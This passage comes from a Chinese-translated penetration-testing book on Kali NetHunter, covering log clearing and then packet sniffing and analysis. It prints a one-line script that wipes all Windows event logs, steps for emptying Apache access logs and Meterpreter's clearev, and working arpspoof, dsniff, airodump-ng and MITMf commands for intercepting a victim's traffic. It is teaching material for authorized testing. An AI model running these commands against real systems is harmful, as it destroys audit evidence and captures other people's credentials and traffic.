![image](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/hsn-pentest-kali-nthtr/img/799f115a-6ac5-49ff-b4f3-15564a198233.png)

此外，`clear-log`语法可以用作`cl`的替代：

![image](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/hsn-pentest-kali-nthtr/img/51e88a58-7bec-4d64-8b54-b1d1c1a11382.png)

+   **练习 2：使用单个脚本清除所有日志**

当我们运行`wevtutil el`命令时，我们看到了一个很长的事件日志类别列表。然而，清除每个类别是非常耗时的，因此在执行时使用以下脚本清除每个类别：

```
for /F "tokens=*" %1 in ('wevtutil.exe el') DO wevtutil.exe cl "%1"
```

![image](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/hsn-pentest-kali-nthtr/img/1608a511-f18a-48d0-9015-9def24fa98f5.png)

如前面的屏幕截图所示，在执行我们的命令后，每个日志文件都被清除了。在下一节中，我们将讨论在 Linux 中清除日志的方法。

# 在 Linux 中清除日志

与所有操作系统一样，Linux 系统上也会生成和存储日志。日志文件是系统上发生的所有活动的记录。以下是 Linux 日志文件的一般位置：

![image](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/hsn-pentest-kali-nthtr/img/351aa78d-a51f-421c-a64a-98db4a0412ea.png)

![image](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/hsn-pentest-kali-nthtr/img/ae25c5fe-4da6-4f63-b66c-cd758c511956.png)

以下是 Linux 系统上的其他日志位置：

+   **示例 1：使用 null 清除日志**

在这个例子中，我们将使用 null，一个不存在的对象，来删除文件的内容。我们将清除 Linux 系统上 Apache `access.log`文件的日志。空对象是操作系统中没有任何属性或特征的实体。

要发现文件的位置，请使用`locate`命令后跟文件名。在这个练习中，我们使用`locate access.log`命令来显示包含`access.log`字符串序列的所有文件的位置：

![image](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/hsn-pentest-kali-nthtr/img/eb252872-29bb-4454-9214-386e545aaf6c.png)

此外，我们可以使用`locate apache2 | grep “access.log”`命令来发现属于 Linux 包的文件并过滤我们的搜索。

接下来，我们将使用`cat`命令后跟文件路径来确定是否有任何日志条目：

![image](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/hsn-pentest-kali-nthtr/img/43e696e4-6eb2-4717-93bd-03c53dc74d32.png)

正如我们所看到的，前面的屏幕截图中包含了`access.log`文件中的条目。此外，我们使用`du –sh <filename>`命令来确定文件大小；如果是 0 KB，则文件为空，如果文件大小大于 0 KB，则文件包含条目：

![image](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/hsn-pentest-kali-nthtr/img/36c8d2d2-ed6d-48d6-84c9-80ca959cd9a1.png)

现在我们将使用`cd /var/log/access.log`命令切换到`access.log`文件的位置，并将 null 重定向到文件：

![image](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/hsn-pentest-kali-nthtr/img/09cdce3d-5034-4d11-ac55-e592082368a4.png)

如果我们再次对文件使用`cat`命令，我们会看到没有条目，文件大小为 0 KB：

![image](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/hsn-pentest-kali-nthtr/img/f6ef0b61-e2f4-4282-a797-5563b5d14950.png)

+   **练习 2：使用 True 实用程序清除日志**

另一种清除/删除文件中日志的技术是使用`True`实用程序。我们已经向我们的 Web 服务器生成了一些流量，如下面的屏幕截图所示：

![image](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/hsn-pentest-kali-nthtr/img/27c36585-0b45-4078-b36f-b6d2cf947915.png)

目前，我们的文件大小为 8 KB：

![image](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/hsn-pentest-kali-nthtr/img/a697f3c6-b5ec-4fa1-923a-4f719bb5d3a6.png)

使用`true`命令后跟文件名或带有文件的路径将擦除条目：

![image](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/hsn-pentest-kali-nthtr/img/1f029af0-fddb-4411-bdeb-bac795a9b8ff.png)

`true`命令/实用程序有一个描述，说它不做任何工作或什么都不做，成功。

我们现在可以验证文件中没有条目，文件大小为 0 KB：

![image](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/hsn-pentest-kali-nthtr/img/bdb26759-64ac-49c0-a7a6-317389d866e7.png)

+   **使用 Meterpreter 清除 Windows 日志**

在 Metasploit 框架中，存在一个非常先进和动态可扩展的有效载荷，称为**Meterpreter**。在渗透测试的利用阶段使用这个实用程序，它将允许您在目标系统上执行分段有效载荷，这可以在目标系统和攻击者的机器之间创建绑定甚至反向 shell。

Metasploit 是由 Rapid7 创建的一个开发框架（[www.rapid7.com](http://www.rapid7.com)）。它允许渗透测试人员收集有关目标的信息，发现漏洞，创建和传递利用和有效载荷到目标，并创建后门。这就像一个渗透测试人员的工具包，用于发现和利用漏洞。

Meterpreter 旨在具有隐秘性、强大性和可扩展性。一旦成功利用了系统，您可以使用`clearev`命令清除以下日志：`Application`，`System`和`Security`：

![image](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/hsn-pentest-kali-nthtr/img/dd590168-af56-41d4-8f24-ae25b4a4aac3.png)

如前面的屏幕截图所示，Meterpreter 正在清除目标系统上每个类别的日志。清除的条目数也列出。

# 总结

在本章中，我们讨论了在渗透测试期间保持隐秘的方法，同时模拟对目标系统和网络的攻击。我们讨论了各种类型的日志及其位置。此外，我们看了一些场景，我们在其中使用各种技术清除了 Windows 和 Linux 操作系统上的日志。

在下一章中，我们将介绍*数据包嗅探和流量分析*。我们将使用不同的技术来捕获流量，并使用各种工具进行分析，以获取机密信息。


# 第三部分：高级渗透测试任务和工具

在本节中，我们将学习 NetHunter 用于利用网络和无线设备的工具。我们还将了解如何选择用于测试的硬件适配器，并了解一些保护系统的技术。

本节包括以下章节：

+   第八章，*数据包嗅探和流量分析*

+   第九章，*针对无线设备和网络*

+   第十章，*避免被检测*

+   第十一章，*加固技术和对策*


# 第七章：数据包嗅探和流量分析

在渗透测试的侦察或信息收集阶段，我们对目标的信息和细节越多，就越有可能成功利用目标系统或网络上的漏洞。我们将研究 Kali Linux 和 NetHunter 中的各种嗅探和网络流量分析工具和实用程序。

在本章中，我们将涵盖以下主题：

+   使用各种工具捕获网络流量

+   数据包分析

让我们深入研究一下！

# 嗅探流量的需求

为什么渗透测试人员需要了解数据包嗅探的好处？数据包嗅探使渗透测试人员能够监视和捕获网络流量。在计算机网络上进行嗅探也是一种窃听行为。窃听涉及在电线上植入设备，例如网络电缆或电话线，以监视和捕获敏感数据。

以下是可能被数据包嗅探器捕获的一些敏感信息的示例：

+   Telnet 流量

+   FTP 用户名和密码

+   DNS 流量

+   Web 流量

+   电子邮件流量

+   通常，任何以明文格式发送的用户名和密码

这只是一小部分，但是还有很多信息以比特的形式通过网络发送。嗅探器可以是硬件或软件，用于植入网络。基于硬件的嗅探器通常至少有两个接口（端口）；这允许基于硬件的嗅探器放置在网络上并拦截通过它的所有网络流量。

以下图表显示了一个放置在网络中的网络嗅探器，位于交换机和路由器之间。来自客户设备（例如 PC）的所有流量，无论是发送到路由器或路由器以外，反之亦然，都将被设备或攻击者机器拦截和捕获。但是，如果 PC 之间进行互相通信，例如 PC1 向 PC3 发送数据，网络嗅探器将无法拦截或捕获流量，因为此流量不会通过它：

![image](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/hsn-pentest-kali-nthtr/img/a03ba595-8c00-4328-b03a-51538f2def42.jpg)

基于硬件的嗅探器可以是非常小的设备，可能只有信用卡大小或火柴盒大小。以下是 Hak5 制造的 Packet Squirrel 的图片（[`shop.hak5.org`](https://shop.hak5.org)）。它的功能之一是捕获通过内联传递的流量并将其存储在 USB 闪存驱动器上（可连接）。该设备既适用于渗透测试人员，也适用于系统管理员，因为它包含允许系统管理员远程访问网络并在局域网内对设备执行故障排除技术的功能：

![image](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/hsn-pentest-kali-nthtr/img/3a7cb24a-199b-45ed-ae85-3bbe73c38125.jpg)

正如我们所看到的，这是一个内联数据包嗅探器。它将能够捕获和存储通过它的所有网络流量。

# 数据包嗅探技术类型

通常使用以下技术进行数据包嗅探：

+   主动嗅探

+   被动嗅探

# 主动嗅探

主动嗅探涉及渗透测试人员执行的某种操作，例如将用户流量重定向到另一个网关，以监视和捕获网络上的数据包。渗透测试人员可以通过修改 ARP 表中的 IP-MAC 条目，在受害者的机器上执行 ARP 缓存中毒攻击。

向交换机中注入虚假的 MAC 地址将导致 CAM 表溢出，使交换机将所有传入流量泛洪到所有其他端口。

此外，在网络上安装一个 Rogue DHCP 服务器会为客户端提供一个非法的默认网关和 DNS 服务器。受害者的流量将被重定向到潜在的恶意网站，并且他们的流量可能会被拦截。

渗透测试人员需要执行一个先导攻击，以引起受害者流量的重定向。 以下图表简要介绍了主动嗅探：

![image](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/hsn-pentest-kali-nthtr/img/e842fd4b-2328-4af6-95e0-a4b7ca183b7c.jpg)

前面的图表描述了典型的中间人（MITM）攻击。

# 被动嗅探

被动嗅探不需要太多干预。 它允许渗透测试人员在不必发起任何攻击来重定向用户流量的情况下监视和捕获网络流量。 在被动嗅探中，渗透测试人员将与网络上的一个集线器建立连接，因为集线器会将传入的信号广播到所有其他端口。

下图显示了一个被动嗅探的例子，攻击者连接到网络段上的一个集线器，并将沿线传递的所有流量的副本发送到他们的机器：

![image](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/hsn-pentest-kali-nthtr/img/5f1b94e7-567f-4e36-bdc4-f29602804d2b.jpg)

前面的拓扑图显示了在网络上实施集线器的效果。

# 数据包嗅探的工具和技术

在本节中，我们将讨论各种工具和技术，这些工具和技术可以帮助渗透测试人员成功地捕获网络上的数据包。

# Aircrack-ng

最流行的无线破解工具之一是 Aircrack-ng。 Aircrack-ng 实际上是一套专门用于无线网络的多个安全审计工具。

Aircrack-ng 套件允许渗透测试人员监视无线网络，捕获空中数据包，执行各种类型的攻击，创建伪造的接入点（APs），并执行 WEP 和 WPA 破解。

在第十三章*选择 Kali 设备和硬件*中，我们简要讨论了使用外部无线网络接口卡（NICs）（例如 ALFA Network AWUS036NHA）。 您如何确定无线 dongle 或 WLAN NIC 能否在目标网络上进行监视或执行数据包注入？ 在 aircrack-ng 中，存在一个名为 airmon-ng 的工具，它允许您测试无线 NIC 的兼容性。

有关 Aircrack-ng 工具套件的更多信息，请访问它们的官方网站：[www.aircrack-ng.org](http://www.aircrack-ng.org)。

在 aircrack-ng 套件中，使用 airmon-ng 工具来监视无线网络。 此工具可以帮助渗透测试人员确定以下内容：

+   扩展服务集标识符（ESSID）

+   基本服务集标识符（BSSID）

+   目标无线网络上使用的无线加密标准

+   渗透测试人员的机器与无线路由器之间的大致距离

+   无线网络的操作频道

# 使用 airmon-ng 观察无线网络

首先，我们将验证设备上可用的无线接口数量。 为此，请使用`iwconfig`命令，如下图所示：

![image](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/hsn-pentest-kali-nthtr/img/08b8c24d-0140-4564-a82d-3617bd437f4e.jpg)

仅使用`airmon-ng`命令将为您提供本地无线接口的列表：

![image](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/hsn-pentest-kali-nthtr/img/d7d18840-a3c3-45e0-bc48-fa1c8a66c5dd.png)

要开始，您必须终止可能在启用监视模式时引起干扰的任何进程。 使用`airmon-ng check kill`命令在 Kali NetHunter 上检查并终止这些进程：

![image](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/hsn-pentest-kali-nthtr/img/63cf422a-2559-4ce6-90aa-2ae5c2628a97.jpg)

接下来，我们将使用`airmon-ng start wlan1`命令启用无线网卡进入监视（混杂）模式：

![image](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/hsn-pentest-kali-nthtr/img/6ac17892-cfeb-410f-ac34-5cc863f7b44a.png)

您可以使用`iwconfig`命令来确定设备上可用的无线接口数量。

输出后，会出现一个新的逻辑接口：`wlan1mon`。 此接口将用于在 Aircrack-ng 中执行所有监视和捕获功能。

接下来，要查看周围所有无线网络，请使用`airodump-ng wlan1mon`命令：

![image](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/hsn-pentest-kali-nthtr/img/a910f559-dd6f-4290-99f1-3121508df737.jpg)

在截图的上部分，我们可以看到以下内容：

+   **BSSID**：接入点或无线路由器的媒体访问控制（MAC）。

+   **PWR**：功率评级。功率级别越低，距离我们越远。

+   **Beacons**：特定 AP 或无线路由器发送的信标消息数量。

+   **CH**：无线路由器正在运行的信道。

+   **Enc**：加密标准，如 WEP、WPA、WPA 或 Open。

+   **Cipher**：加密标准中使用的加密密码。

+   **Auth**：认证机制，如预共享密钥（PSK）或管理（MGT）。

+   **ESSID**：移动设备看到的无线网络的名称。这也被称为服务集标识（SSID）。

让我们也观察一下输出的下部分：

![image](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/hsn-pentest-kali-nthtr/img/0072246d-0fc1-4fdc-b0e0-d484b269b47c.png)

`STATION`列显示了通过 BSSID 值与特定无线路由器关联的客户端的 MAC 地址。功率级别提供了客户端和您的设备之间的大致距离。探针显示了客户端正在寻找的网络（SSID）。

为了更上一层楼，使用以下命令将允许渗透测试者监视、捕获和保存捕获的数据副本以供离线分析：

```
airodump-ng –w offline_file –c <channel number> --bssid <MAC addr of router> wlan1mon
```

以下是一个截图，演示了如何使用一系列命令 - 目标无线路由器的 MAC 地址的一部分被模糊处理以保护隐私：

![image](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/hsn-pentest-kali-nthtr/img/54ddc517-9554-4e53-bef4-f151c2970a4f.png)

`-w`允许您在接口上存储流量监视器的副本。`-c`指定要监听的信道。信道号应与目标网络相同。`--bssid`指定目标无线路由器的 MAC 地址。

默认情况下，文件保存在设备的根目录中。如果您在另一个目录中工作，请使用`ls -l`命令查看当前目录的内容。如果您不确定当前路径，请使用`pwd`命令，它会显示您当前的工作目录。

# Arpspoof

渗透测试者可以使用的一种技术是执行 MITM 攻击，以确保他们能够捕获受害者的流量。让我们想象一下，在一个无线网络上有两个人，Alice 和 Bob。他们都希望在网络上交换一些消息。然而，有一个渗透测试者的任务是观察和捕获网络流量。

Alice 和 Bob 将他们的移动设备连接到无线路由器或接入点（AP）并开始通信。无线路由器是一个中间设备，将处理他们所有的流量转发：

![image](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/hsn-pentest-kali-nthtr/img/189ddb88-0af7-4da6-bafe-c4813b39727f.jpg)

使用 arpsoof，渗透测试者能够欺骗路由器的**媒体访问控制**（**MAC**）地址，以欺骗受害者，使网络上的其他用户相信渗透测试者的机器现在是路由器或默认网关。以下图表显示了渗透测试者连接到与 Alice 和 Bob 相同的无线网络。现在的目标是说服 Alice 的机器，唯一的方法是将所有流量发送到渗透测试者，反之亦然，以便 Bob 的网络流量：

![image](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/hsn-pentest-kali-nthtr/img/cbdb782e-b3b4-4b17-a57d-92cb7d1a33c0.jpg)

以下是`arpspoof`工具中使用的语法：

```
arpspoof –i <interface> -c <host ip> -t <target ip> <host ip> -r
```

+   `-i`：允许您指定一个接口

+   `-c`：指定硬件地址

+   `-t`：指定目标，如默认网关

+   `host`：指定要拦截数据包的主机

+   `-r`：允许捕获双向流量

要执行成功的 MITM 攻击，我们将有一个受害者，Alice，和一个连接到同一网络的渗透测试者。目标是确保 Alice 的机器认为默认网关是渗透测试者的机器：

![image](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/hsn-pentest-kali-nthtr/img/5f0d2c0a-7529-44db-ac2d-df4a352cc910.jpg)

Alice 和渗透测试者都连接到同一个无线网络（虚线）。然而，渗透测试者使用以下命令来确保 Alice 的所有流量都经过他们的机器，然后再由他们的机器转发到实际的默认网关：

```
arpspoof –i wlan0 –t 172.16.17.18 –r 172.16.17.14
```

![image](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/hsn-pentest-kali-nthtr/img/5d29526c-2dfb-4fd1-ad9a-fad754c15783.png)

一旦命令在渗透测试者的机器上执行，它将持续发送伪造的 ARP 消息到 Alice 和默认网关（无线路由器），以确保它们的本地 ARP 缓存被更新并包含了伪造的 ARP 条目。

# Dsniff

正如创建者所描述的，**Dsniff**是一个网络审计工具和密码嗅探器的集合。它为渗透测试者提供了执行中间人攻击、数据包分析和捕获网络数据包的能力。

在 Kali Linux 或 Kali NetHunter 上使用以下命令将启用 Dsniff 来监听指定接口上的任何流量：

```
dsniff -i <*network adapter*>
```

以下命令是使用`dsniff`来监视设备上`wlan0`接口上的流量的示例：

```
dsniff –i wlan0
```

![image](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/hsn-pentest-kali-nthtr/img/e2115dc8-bb7c-4a3e-a1ed-8be838b6ec42.jpg)

# Kismet

另一个在 Kali NetHunter 中非常流行的无线监控工具是 Kismet。**Kismet**就像无线网络的瑞士军刀。它可以在无线网络上嗅探数据包，为渗透测试者提供了 war-driving 功能，并能够检测目标网络上的各种无线攻击和威胁。

要开始，可以在 Kali NetHunter 的终端中输入`kismet`。你应该会看到以下屏幕出现；通过按下*Enter*键选择`OK`：

![image](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/hsn-pentest-kali-nthtr/img/30935e96-3f9b-4e21-a526-c9a32dea8ad1.jpg)

Kismet 将询问你是否允许自动启动 Kismet 服务器；只需选择是：

![image](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/hsn-pentest-kali-nthtr/img/d4e50e27-b509-42e4-903b-2a7491295b1c.jpg)

接下来会出现以下窗口。你可以启用/禁用日志记录，并为日志文件设置一个标题，如果你决定启用日志记录的话。我建议在选择**开始**之前禁用**显示控制台**选项。禁用**显示控制台**选项将直接进入 Kismet 的监控用户界面：

![image](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/hsn-pentest-kali-nthtr/img/213f214a-e4bb-4523-a639-cc1d69528897.jpg)

如果你继续使用默认参数，下面的窗口是控制台窗口，显示了 Kismet 所做的每个活动的日志。只需点击**关闭控制台窗口**即可查看 Kismet 的监控用户界面：

![image](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/hsn-pentest-kali-nthtr/img/2cbe5383-cd51-4fab-892a-86f1fa9457e3.jpg)

现在你已经进入了 Kismet 的主界面，让我们熟悉一下它并了解它的功能。要添加一个监控源，比如一个无线接口，选择`Kismet` | `添加源`：

![image](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/hsn-pentest-kali-nthtr/img/1918a613-a119-42a4-9ce5-478ee7cfb066.jpg)

我选择将我的`wlan1mon`接口作为源。记住，你可以在 Kali NetHunter 上使用`iwconfig`命令来确定你可用的无线接口：

![image](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/hsn-pentest-kali-nthtr/img/50290d4d-71ef-4499-9d45-1cdb29a0d1d8.jpg)

Kismet 有能力确定设备的制造商。

一旦你成功将源接口添加到 Kismet 上，你将开始看到各种无线网络出现在窗口的上半部分。通过选择一个无线网络，相关的客户端将显示在下半部分：

![image](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/hsn-pentest-kali-nthtr/img/69971b5c-d5ac-4e19-8601-86bb46556036.jpg)

要获取有关目标网络的更多详细信息，请选择`Windows` | `网络详细信息`。正如我们所看到的，Kismet 为我们提供了一个简化的视图，显示了目标网络的名称（SSID）、BSSID（MAC 地址）、设备类型、操作频道、无线电频率、信号强度和加密标准和类型：

![image](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/hsn-pentest-kali-nthtr/img/e982753b-4778-4429-87ac-301ed2aae2c2.jpg)

# Tcpdump

简单来说，`tcpdump`工具是一个命令行协议分析器。在远程访问渗透测试的情况下，比如你的 Kali NetHunter 设备或者附近目标无线网络中的树莓派，这个工具非常有用。

要启用监视，输入`tcpdump –i wlan0`命令：

![image](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/hsn-pentest-kali-nthtr/img/02edc712-9e04-4207-bdb3-ab20b69221c0.png)

请注意，一旦输入了先前的命令，结果就开始在命令行界面中显示。这可能非常具有挑战性，进行实时分析。我建议您首先捕获数据包并将其存储在离线文件中，然后进行分析。

要捕获网络数据包并将其存储在离线文件中，我们可以使用`tcpdump –i wlan0 –w tcpdumpcapture.pcap`命令：

![image](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/hsn-pentest-kali-nthtr/img/1d093235-183f-42c1-bde1-0f805f65d6ee.png)

`-w`参数允许您指定要写入捕获数据的文件。在捕获过程中，结果不会显示在屏幕上，而是写入`tcpdumpcapture.pcap`文件。

使用`ls –l | grep .pcap`命令，我们可以看到文件存在如预期的那样：

![image](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/hsn-pentest-kali-nthtr/img/d21c2fba-24aa-48ce-a3ca-bb4c25ba90fe.png)

要验证或读取文件中写入的数据，使用`tcpdump –r <filename>`命令：

![image](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/hsn-pentest-kali-nthtr/img/f3fc67ae-e29c-4377-b2bc-e09d723c40e6.jpg)

# TShark

**TShark**是另一个命令行网络协议分析器。它具有类似的功能，可以捕获实时网络上的流量，甚至读取先前保存以供进一步分析的离线捕获。它的许多功能与先前提到的工具**tcpdump**类似。

要捕获数据包并将数据输出到文件中，我们可以使用`tshark –i <interface> -w <output file>`命令：

![image](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/hsn-pentest-kali-nthtr/img/d41e8d76-1ed4-432e-8080-f9111bb39298.jpg)

再次注意，实时流量不会显示在终端上，因为它被写入`tsharkcapture.pcap`文件。但是，如果不使用`-w`参数，我们将看到命中我们的`wlan0`接口的所有流量：

![image](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/hsn-pentest-kali-nthtr/img/71ed1145-f815-428c-ad5b-801dd6b7bd92.png)

输出显示我的网络上的另一台机器正在尝试为 Dropbox 执行 LAN 同步。

# MITM 框架

对于这个工具，名字就说明了一切。这是一个包含许多功能的 MITM 框架，比如捕获受害者的 cookie 信息，执行键盘记录功能和地址解析协议（ARP）注入攻击，以及欺骗。

在这个练习中，我们将拦截受害者和默认网关之间的数据包。要开始，请在您的 Android 设备上打开菜单并打开 NetHunter 应用程序：

![image](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/hsn-pentest-kali-nthtr/img/78d2b8c9-849c-498e-a340-2bb96b7075db.jpg)

打开应用程序后，使用左侧的内置菜单展开类别列表。您将看到 MITM 框架与列表，点击它打开：

![image](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/hsn-pentest-kali-nthtr/img/5b5ae811-9450-4064-be0e-db703aa0c5e6.png)

将出现以下窗口，只需选择要用于攻击的接口：

![image](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/hsn-pentest-kali-nthtr/img/5cfc76a8-e65a-4534-859a-51043a9e4398.jpg)

完成后，向右滑动，直到进入**欺骗设置**选项卡。只需启用欺骗插件，选择重定向模式为 ARP，并设置网关地址和受害者的 IP 地址，如下面的屏幕截图所示：

![image](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/hsn-pentest-kali-nthtr/img/32d7fd33-a5d8-4d04-b79b-48bf2af9f7b0.jpg)

一旦所有参数都配置好，选择`开始 MITMf 攻击`开始拦截数据包。记住，您可以使用先前提到的任何数据包捕获工具，如 TShack、Tcpdump，甚至 Dsniff，来捕获和存储离线数据包以供以后分析。

# 数据包分析技术

在本节中，我们将讨论使用 Kali NetHunter 中的工具进行数据包分析。我们将使用来自[`wiki.wireshark.org/SampleCaptures`](https://wiki.wireshark.org/SampleCaptures)和[`www.honeynet.org/challenges`](https://www.honeynet.org/challenges)的各种示例文件，因为这些示例是为教育目的而制作的，并包含通常在生产网络上找到的大量数据。

# Dsniff

我们之前使用 Dsniff 来捕获数据包，但现在我们将使用它来帮助我们重新组装并查看离线 PCAP 文件中发生的明文事务。对于此练习，我们将使用来自[`wiki.wireshark.org/SampleCaptures#Telnet`](https://wiki.wireshark.org/SampleCaptures#Telnet)的`telnet.cooked.pcap`文件。

使用`dnsiff –p <filename>`命令来启用来自离线先前保存的捕获文件的内容的处理。如下图所示，有两个设备之间进行了通信：

![image](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/hsn-pentest-kali-nthtr/img/cb0ed1f1-2572-4dda-bf26-ebc6d1ab25d6.jpg)

以下是我们能够解释的信息：

![image](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/hsn-pentest-kali-nthtr/img/2b37e934-e802-493e-9b84-fc2d36f9e25b.jpg)

此外，我们知道这是一个由 Dsniff 识别的 Telnet 连接，目的端口是`23`。接下来的文本是从客户端（`192.168.0.2`）发送到 Telnet 服务器（`192.168.0.1`）的实际命令。

# Tshark

我们可以使用 TShark 从我们的离线 PCAP 文件中收集信息。要获取用于访问每个唯一网站的每个 Web 浏览器的副本，我们可以使用以下命令：

```
tshark -r conference.pcapng -Y http.request -T fields -e http.host -e http.user_agent | sort –u | uniq -c | sort -n
```

我们能够看到每个 URL（在下面的截图中左侧）和发出`HTTP GET`请求到 Web 服务器的用户代理（Web 浏览器）：

![image](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/hsn-pentest-kali-nthtr/img/92aeddee-556e-4781-845f-38e13fdf7800.jpg)

让我们尝试检索所有 DNS 查询。为此，我们可以使用以下命令：

```
tshark -r conference.pcapng | grep "Standard query" | cut -d "A" -f 2 | sort –u
```

这个命令从`conference.pcapng`文件中读取内容，并创建一个初始过滤器，只显示包含`Standard query`字符串的行。完成后，它将删除任何不必要的数据，并显示 DNS 查询中的每个唯一域名或主机名：

![image](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/hsn-pentest-kali-nthtr/img/8db3a9d8-7b46-459f-a902-cd9289848fcc.jpg)

如何从保存的捕获文件中提取工件？使用 TShark 是可能的。使用`–export-objects [smb, http, smb, tftp] <output_folder>`命令来提取对象。在这个例子中，我们将提取使用 HTTP 应用程序协议传输的所有文件。我们首先使用以下命令：

```
tshark -nr conference.pcapng --export-objects http,tshark_folder
```

然后我们验证提取是否成功：

![image](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/hsn-pentest-kali-nthtr/img/71995bf1-b768-4f8e-9efa-307c2c9a8205.jpg)

# Urlsnarf

**Urlsnark**用于从实时网络流量甚至离线`.pcap`文件中嗅探 HTTP 请求。这个工具可以帮助我们确定网络上的客户端访问了哪些网站。对于此练习，我们将使用来自[`www.honeynet.org/node/1220`](https://www.honeynet.org/node/1220)的`conference.pcap`文件。

要开始，请下载并在设备上离线保存。使用`urlsnarf –p <file>`命令来获取所有 HTTP 数据：

![image](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/hsn-pentest-kali-nthtr/img/85d23bce-3b1d-4a41-acbb-cfb1b2774961.png)

但是，正如你所看到的，输出非常庞大。让我们创建一个过滤器，只提供此文件中的 HTTP URL。我们可以使用以下命令：

```
urlsnarf -p conference.pcapng | grep "http://" | cut -d "/" -f 5
```

![image](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/hsn-pentest-kali-nthtr/img/c6772e4c-3be1-4abe-903c-8573d4a7881b.jpg)

我们的输出现在清晰多了。我们有了在此捕获期间用户访问的所有 URL 的列表。让我们创建另一个过滤器，以确定每次通信期间的用户代理（客户端的 Web 浏览器）。使用以下命令将删除重复项并对输出进行排序：

```
urlsnarf -p conference.pcapng | grep "http://" | cut -d '"' -f 6 | sort –u
```

![image](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/hsn-pentest-kali-nthtr/img/36ea403f-3eb7-497d-8549-2bd473526eda.png)

# Tcpdump

我们可以使用 Tcpdump 来查看用户代理，使用`tcpdump –r <file> -nn -A -s1500 -l | grep "User-Agent:" | sort –u`命令，如下图所示：

![image](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/hsn-pentest-kali-nthtr/img/216622ca-2f39-40a8-b2c5-a984f82b7223.jpg)

如前所述，用户代理确定 Web 浏览器。这些信息在取证调查中可能很有用。此外，我们可以使用`tcpdump`来查看捕获文件中的所有源和目的 IP 地址。

要获取源 IP 地址和源端口的列表，我们可以使用以下命令：

![image](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/hsn-pentest-kali-nthtr/img/a0f5f0fe-4306-4fa9-a906-f68469a1743f.jpg)

查看所有目标 IP 地址和目标端口号，请使用以下命令：

![image](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/hsn-pentest-kali-nthtr/img/0e1b0672-f455-4063-8775-26c3fd9f2b58.jpg)

# 总结

在本章中，我们讨论了在网络上嗅探和分析数据包的好处。主要目的是捕获敏感信息，这将帮助我们进行渗透测试。我们比较和对比了主动和被动嗅探技术。此外，我们演示了使用 Kali NetHunter 上的一套工具进行各种数据包捕获技术和分析。希望本章对您的学习和职业有所帮助。

在下一章中，我们将涵盖针对无线设备和网络的目标。


# 第八章：针对无线设备和网络

十年前，世界上没有那么多移动设备。那时，只有笔记本电脑使用无线网络技术，直到智能手机行业起步。现代组织正在采用“自带设备”（BYOD）概念，即组织允许员工安全地连接他们的个人移动设备，如智能手机、平板电脑或笔记本电脑，到企业网络，这将提高整体生产力。

随着越来越多的移动设备进入企业网络，这引发了一些安全问题，威胁着企业无线和有线网络基础设施的安全姿态。此外，无线网络设备（如接入点（AP）或无线路由器）的配置可能不符合公司的标准。有时，网络管理员可能会忘记应用安全配置，或者仅仅使用默认设置在生产网络中部署设备。

在本章中，我们将讨论以下主题：

+   无线网络类型

+   无线标准

